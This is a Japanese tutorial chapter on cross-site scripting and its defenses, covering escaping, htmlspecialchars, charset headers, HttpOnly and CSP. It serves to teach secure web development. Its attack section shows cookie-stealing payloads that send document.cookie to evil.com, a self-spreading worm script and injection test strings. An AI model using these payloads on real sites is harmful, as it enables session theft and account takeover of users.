# 安全なWebアプリケーションの作り方（第5章）

第4章では入力値の検証について学びました。第5章では **出力（表示）処理** に焦点を当て、**クロスサイトスクリプティング（XSS）** の仕組みと対策を解説します。

---

## 📜 クロスサイトスクリプティング（XSS）

**クロスサイトスクリプティング（Cross-Site Scripting / XSS）** は、Webページに **悪意ある JavaScript を注入** し、閲覧者のブラウザ上で実行させる攻撃です。

| 項目 | 内容 |
|------|------|
| **別名** | クロスサイト・スクリプティング |
| **分類** | インジェクション系脆弱性（[[02_Webアプリの機能と脆弱性（徳丸本4章）\|第4章]]） |
| **攻撃対象** | 他ユーザーのブラウザ |
| **インターフェース** | HTML |

### 日常生活での例え

- **正常なWebページ**: 掲示板に「こんにちは」と表示される
- **XSS**: 掲示板に「こんにちは `<script>` 悪意あるコード `</script>`」と書かれ、**他の人が読むたびにスクリプトが動く**

### 攻撃者の目的

| 目的 | 説明 |
|------|------|
| **セッション窃取** | Cookie からセッションIDを盗み、なりすましログイン |
| **フィッシング** | 偽のログインフォームを表示してパスワードを盗む |
| **キーロギング** | 入力されたキー操作を外部に送信 |
| **ページ改ざん** | 表示内容を書き換える |
| **ワーム拡散** | 悪意あるスクリプトを自動的に他ページへ投稿 |

### なぜ起きるか

```
ユーザー入力 → サーバー → HTMLにそのまま埋め込み → ブラウザが <script> を実行
```

**根本原因:** 出力時に **HTMLエスケープ** を行わず、ユーザー入力をそのまま HTML に含めている。

---

## 🍪 XSSによるクッキー値の盗み出し

XSS で最も恐れられる被害のひとつが、**Cookie（セッションID）の盗み出し** です。

### 攻撃の流れ

```
1. 攻撃者が XSS のペイロード（攻撃コード）をページに仕込む
2. 被害者がそのページを開く
3. ブラウザ上で JavaScript が実行される
4. document.cookie で Cookie を読み取り、攻撃者のサーバーへ送信
5. 攻撃者が盗んだセッションIDで被害者になりすます
```

### 攻撃コードの例

```html
<script>
  document.location =
    'https://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

```javascript
// より目立たない方法（画像タグを利用）
new Image().src = 'https://evil.com/steal?cookie=' + document.cookie;
```

### なぜ Cookie が読めるか

- 同一オリジンのページで実行された JavaScript は `document.cookie` にアクセスできる
- XSS により **そのサイトのページ上** でスクリプトが動くため、Cookie も読める

### 対策の方向性

| 対策 | 効果 |
|------|------|
| **HTMLエスケープ** | XSS 自体を防ぐ（根本対策） |
| **HttpOnly 属性** | JavaScript から Cookie を読めなくする（保険） |

## 🐛 XSSを悪用したワーム

**XSS ワーム** とは、XSS を利用して **悪意あるスクリプトを自動的に拡散** させる攻撃です。ソーシャルネットワークの掲示板やコメント欄で特に問題になります。

### 攻撃の流れ

```
1. 攻撃者が掲示板に XSS ペイロードを投稿
2. ユーザーAがページを閲覧 → スクリプト実行
3. スクリプトがユーザーAの権限で「同じペイロード」を自動投稿
4. ユーザーB, C, D... が閲覧 → さらに拡散
5. 指数関数的に感染が広がる
```

### ワームのペイロード例（概念）

```html
<script>
  // ログイン済みユーザーの権限でコメントを自動投稿
  fetch('/api/comments', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      text: '<script>/* 同じ攻撃コード */</script>'
    })
  });
</script>
```

### 反射型 vs 持続型

| 種類 | ワーム化しやすさ |
|------|----------------|
| **持続型（Stored）** | 非常に高い（DBに保存され、全訪問者が実行） |
| **反射型（Reflected）** | 低い（被害者が特定URLを開いたときのみ） |

**持続型 XSS** は掲示板・SNS・Wiki など **ユーザー入力が保存される場所** で特に危険です。

---

## 🔀 反射型XSSと持続型XSS

XSS は、悪意あるスクリプトが **どこに・どう残るか** によって2種類に分けられます。

### 反射型XSS（Reflected XSS / 非持続型）

**リクエストに含まれた入力が、その場でレスポンスに反映** されるタイプです。サーバーに保存されません。

```
攻撃者が悪意あるURLを作成
  ↓
https://example.com/search?q=<script>alert(1)</script>
  ↓
被害者がURLをクリック
  ↓
サーバーが q の値を検索結果ページに表示
  ↓
<script> が実行される
```

| 特徴 | 内容 |
|------|------|
| **保存** | サーバーに保存されない |
| **拡散** | URLを踏ませる必要がある（フィッシング等） |
| **発生箇所** | 検索結果、エラーメッセージ、リダイレクト |

### 持続型XSS（Stored XSS / 蓄積型）

**悪意あるスクリプトがサーバー（DB等）に保存** され、ページを表示するたびに実行されます。

```
攻撃者がコメント欄に <script>...</script> を投稿
  ↓
DBに保存される
  ↓
他のユーザーがページを閲覧
  ↓
全員のブラウザでスクリプトが実行される
```

| 特徴 | 内容 |
|------|------|
| **保存** | DB・ファイル等に永続化 |
| **拡散** | ページを見た全員が被害 |
| **発生箇所** | 掲示板、コメント、プロフィール、Wiki |

### 比較表

| | 反射型XSS | 持続型XSS |
|---|----------|----------|
| **別名** | 非持続型 | 蓄積型 |
| **保存** | なし | あり |
| **被害者** | URLを開いた人 | ページを閲覧した全員 |
| **危険度** | 中 | **高** |
| **ワーム化** | しにくい | しやすい |

## 🛡️ HTMLエスケープの概念

**HTMLエスケープ** は、XSS を防ぐ **最も基本的で重要な対策** です。特殊文字を HTML として解釈されない形式に変換します。

### 仕組み

```
ユーザー入力:  <script>alert(1)</script>
       ↓ HTMLエスケープ
出力:          &lt;script&gt;alert(1)&lt;/script&gt;
       ↓ ブラウザの表示
画面表示:      <script>alert(1)</script>  （テキストとして表示、実行されない）
```

### エスケープ対象の文字

| 文字 | エスケープ後 | 理由 |
|------|------------|------|
| `<` | `&lt;` | タグの開始を防ぐ |
| `>` | `&gt;` | タグの終了を防ぐ |
| `"` | `&quot;` | 属性値の脱出を防ぐ |
| `'` | `&#x27;` または `&apos;` | 属性値の脱出を防ぐ |
| `&` | `&amp;` | 実体参照の開始を防ぐ |

### エスケープのタイミング

```
❌ 入力時にエスケープ → DBにエスケープ済みデータが保存され、二重エスケープの原因に
✅ 出力時にエスケープ → 表示直前に変換（推奨）
```

**原則:** **出力する場所（コンテキスト）に応じて** エスケープする。

| 出力先 | エスケープ方法 |
|--------|--------------|
| HTML本文 | HTMLエスケープ |
| HTML属性 | HTML属性エスケープ |
| JavaScript | JavaScriptエスケープ |
| URL | URLエンコード |

## 📍 要素内容のXSS

HTML には **要素内容（Element Content）** と **属性値（Attribute Value）** など、出力コンテキストが異なります。コンテキストを間違えると、エスケープしても XSS を防げない場合があります。

### 要素内容への XSS

HTML タグの **中身** にユーザー入力を出力するケースです。

```html
<!-- ❌ 脆弱：ユーザー入力 name をそのまま出力 -->
<p>こんにちは、<?= $name ?>さん！</p>

<!-- 攻撃入力: <script>alert(1)</script> -->
<p>こんにちは、<script>alert(1)</script>さん！</p>
```

```html
<!-- ✅ 安全：HTMLエスケープして出力 -->
<p>こんにちは、&lt;script&gt;alert(1)&lt;/script&gt;さん！</p>
```

### 属性値への XSS

HTML 属性の **値** にユーザー入力を出力するケースです。属性値は **引用符で囲む** 必要があります。

```html
<!-- ❌ 脆弱：属性値にエスケープなし -->
<input type="text" value="<?= $keyword ?>">

<!-- 攻撃入力: " onmouseover="alert(1) -->
<input type="text" value="" onmouseover="alert(1)">
```

```html
<!-- ✅ 安全：エスケープ + ダブルクォートで囲む -->
<input type="text" value="&quot; onmouseover=&quot;alert(1)">
```

### JavaScript コンテキストへの XSS

```html
<!-- ❌ 危険：JS文字列に直接埋め込み -->
<script>var name = '<?= $name ?>';</script>

<!-- 攻撃入力: '; alert(1); // -->
<script>var name = ''; alert(1); //';</script>
```

**対策:** HTMLエスケープだけでは不十分。JavaScript 用のエスケープ、または JSON 形式で安全に渡す。

### コンテキスト別の対策まとめ

| コンテキスト | 対策 |
|------------|------|
| HTML要素内容 | HTMLエスケープ |
| HTML属性値 | HTML属性エスケープ + 引用符で囲む |
| JavaScript | JSエスケープ / JSON.stringify |
| CSS | CSSエスケープ |
| URL | URLエンコード + 許可スキームの検証 |

## 📚 XSSの基本

XSS 対策の基本は、第4章の **入力‐処理‐出力モデル** の「出力」段階で実施します。

```
防御の優先順位：

1. 出力時のエスケープ（根本対策）  ← 最優先
2. 入力値検証（補助）
3. HttpOnly、CSP 等（保険的対策）
```

### 脆弱なコード vs 安全なコード

```php
// ❌ 脆弱（PHP）
$name = $_GET['name'];
echo "<p>こんにちは、{$name}さん！</p>";
```

```php
// ✅ 安全（PHP）
$name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
echo "<p>こんにちは、{$name}さん！</p>";
```

```javascript
// ❌ 脆弱（JavaScript / Node.js）
const name = req.query.name;
res.send(`<p>こんにちは、${name}さん！</p>`);
```

```javascript
// ✅ 安全（テンプレートエンジンの自動エスケープを利用）
// EJS, Pug, React 等はデフォルトでエスケープ
res.render('greeting', { name: req.query.name });
```

### テンプレートエンジンを使う

| テンプレート | 自動エスケープ |
|------------|--------------|
| React / Vue | JSX / テンプレートがデフォルトでエスケープ |
| EJS | `<%= %>` はエスケープあり |
| Twig (PHP) | デフォルトでエスケープ |
| Blade (PHP) | `{{ }}` はエスケープあり |

**注意:** `innerHTML` や `{!! !!}`（エスケープなし出力）を使うと脆弱になる。

## 🔧 htmlspecialchars 関数

**htmlspecialchars** は、PHP で HTML エスケープを行う標準関数です。

### 基本構文

```php
htmlspecialchars(string $string, int $flags, ?string $encoding): string
```

### 使用例

```php
$input = '<script>alert("XSS")</script>';

// 基本的な使い方
echo htmlspecialchars($input);
// 出力: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

// 推奨：ENT_QUOTES でシングルクォートもエスケープ
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```

### フラグ（第2引数）

| フラグ | 効果 |
|--------|------|
| `ENT_QUOTES` | シングルクォート `'` もエスケープ（**推奨**） |
| `ENT_COMPAT` | ダブルクォート `"` のみエスケープ（デフォルト） |
| `ENT_HTML5` | HTML5 向けのエスケープ |

### エンコーディング（第3引数）

```php
// UTF-8 を明示（推奨）
htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```

**必ず UTF-8 を指定** し、文字化けやエンコーディング不一致による XSS を防ぐ。

### 関連関数

| 関数 | 用途 |
|------|------|
| `htmlspecialchars` | HTML 出力用エスケープ |
| `htmlentities` | より多くの文字を実体参照に変換 |
| `htmlspecialchars_decode` | エスケープを元に戻す（表示時は通常不要） |

### 他言語での同等機能

| 言語 | 関数・方法 |
|------|----------|
| PHP | `htmlspecialchars()` |
| Python | `html.escape()` |
| JavaScript | テンプレートエンジン / `he` ライブラリ |
| Ruby | `ERB::Util.html_escape()` |

## 🌐 レスポンスの文字エンコーディング指定

XSS 対策として、レスポンスの **文字エンコーディングを明示** することが重要です。ブラウザが文字コードを誤解すると、フィルタをすり抜ける攻撃（エンコーディング攻撃）の原因になります。

### Content-Type ヘッダ

```
Content-Type: text/html; charset=UTF-8
                              ↑
                    文字エンコーディングを明示
```

### HTML の meta タグ（補助的）

```html
<meta charset="UTF-8">
```

**注意:** HTTP ヘッダの `Content-Type` が優先されます。meta タグだけに頼らない。

### なぜ重要か

| 問題 | 説明 |
|------|------|
| **文字コードの不一致** | UTF-8 想定のデータを Shift_JIS として解釈 |
| **エンコーディング攻撃** | 特殊なバイト列で `<script>` を別の形で表現 |
| **フィルタ回避** | エンコーディングの違いでサニタイズをすり抜ける |

### 設定例

```php
// PHP
header('Content-Type: text/html; charset=UTF-8');
```

```javascript
// Express.js
app.use((req, res, next) => {
  res.setHeader('Content-Type', 'text/html; charset=UTF-8');
  next();
});
```

### ベストプラクティス

- アプリ全体で **UTF-8 に統一**
- 入力・DB・出力すべて同じエンコーディングを使用
- レスポンスヘッダで **charset=UTF-8 を必ず指定**

## 🛡️ XSSに対する保険的対策

HTMLエスケープが **根本対策** である一方、万が一 XSS が起きた場合の被害を **軽減する保険** も存在します。これらだけでは XSS を防げません。

```
根本対策:  HTMLエスケープ、CSP
保険的対策: HttpOnly、X-XSS-Protection 等
```

---

## 🔒 X-XSS-Protection レスポンスヘッダの使用

**X-XSS-Protection** は、ブラウザ内蔵の XSS フィルタを有効にする HTTP レスポンスヘッダでした。

```
X-XSS-Protection: 1; mode=block
```

| 値 | 意味 |
|----|------|
| `0` | フィルタを無効化 |
| `1` | フィルタを有効化 |
| `1; mode=block` | 検出時にページ表示をブロック |

### 現状

| ポイント | 説明 |
|---------|------|
| **非推奨** | Chrome 等の主要ブラウザでは削除または無効化済み |
| **限界** | ブラウザ依存で、すべての XSS を防げない |
| **位置づけ** | 保険的対策。エスケープの代わりにはならない |

### 現代の推奨

X-XSS-Protection の代わりに **Content-Security-Policy（CSP）** の導入が推奨されます。

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

CSP は「このページでは信頼できるソースのスクリプトだけ実行する」と宣言する仕組みで、XSS の影響を大幅に軽減できます。

## ✅ 入力値検証

第4章で学んだ **入力値検証** は、XSS 対策の **補助** として有効です。ただし、**入力値検証だけでは XSS を完全に防げません**。

### 入力値検証でできること

| チェック | 例 |
|---------|-----|
| 制御文字の除去 | 改行・NULL の排除 |
| 文字数制限 | コメント 500文字以内 |
| 許可文字の制限 | ユーザー名は英数字のみ |
| タグの禁止 | `<`, `>` を含む入力を拒否 |

```javascript
// ホワイトリスト：英数字と日本語のみ許可
function validateComment(text) {
  if (!/^[\w\u3040-\u309F\u30A0-\u30FF\u4E00-\u9FFF\s]+$/.test(text)) {
    return '使用できない文字が含まれています';
  }
  if (text.length > 500) {
    return '500文字以内で入力してください';
  }
  return null;
}
```

### 入力値検証の限界

| 限界 | 理由 |
|------|------|
| **ブラックリストは不完全** | `<script>` 以外にも `<img onerror=...>` 等、多数の手法がある |
| **正当な入力を拒否** | 「`<` を含む」等のルールは `<3` など正常な入力も弾く |
| **エンコーディングの回避** | フィルタをエンコーディングの差ですり抜けられる |

**結論:** 入力値検証は **第1の防御線** として有用だが、**出力時の HTMLエスケープが必須**。

## 🍪 クッキーに HttpOnly 属性を付与

**HttpOnly** 属性は、JavaScript から Cookie にアクセスできなくする属性です。XSS による **Cookie 盗み出し** を防ぐ保険的対策として重要です。

### 設定方法

```
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
                              ↑
                    JavaScript から読めなくなる
```

```javascript
// Express.js
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});
```

### 効果

```javascript
// HttpOnly なし
document.cookie;  // "sessionId=abc123"  ← XSS で盗める

// HttpOnly あり
document.cookie;  // ""  ← sessionId は含まれない
```

| 属性 | XSS 対策での役割 |
|------|----------------|
| **HttpOnly** | JS から Cookie を読めなくする |
| **Secure** | HTTPS のみ送信（盗聴防止） |
| **SameSite** | クロスサイト送信を制限（CSRF 対策にも有効） |

### 注意点

| 注意 | 説明 |
|------|------|
| **XSS 自体は防がない** | ページ改ざん・キーロギング等は依然として可能 |
| **セッションID以外** | localStorage に保存したトークンは HttpOnly では守れない |
| **根本対策ではない** | HTMLエスケープと併用する |

## 📝 まとめ

| トピック | 要点 |
|---------|------|
| XSS | 悪意ある JavaScript を被害者のブラウザで実行させる攻撃 |
| Cookie 盗み出し | `document.cookie` 経由。HttpOnly で軽減 |
| XSS ワーム | 持続型 XSS で自動拡散 |
| 反射型 XSS | リクエストに含まれ、その場で反映（非持続型） |
| 持続型 XSS | DB に保存され、閲覧者全員が実行（危険度が高い） |
| HTMLエスケープ | 出力時に `<`, `>`, `"` 等を変換（**根本対策**） |
| 要素内容の XSS | コンテキスト（要素・属性・JS）に応じたエスケープが必要 |
| htmlspecialchars | PHP の HTML エスケープ関数（ENT_QUOTES, UTF-8 推奨） |
| 文字エンコーディング | `Content-Type: charset=UTF-8` を明示 |
| 保険的対策 | HttpOnly、CSP 等（エスケープの代わりにはならない） |
| X-XSS-Protection | 旧来のブラウザフィルタ（現在は非推奨、CSP を推奨） |
| 入力値検証 | 補助的対策。出力エスケープと併用 |
| HttpOnly | JS から Cookie を読めなくする |

### XSS 対策の優先順位

```
1. 出力時の HTMLエスケープ（必須）
2. テンプレートエンジンの自動エスケープを利用
3. Content-Security-Policy（CSP）の設定
```
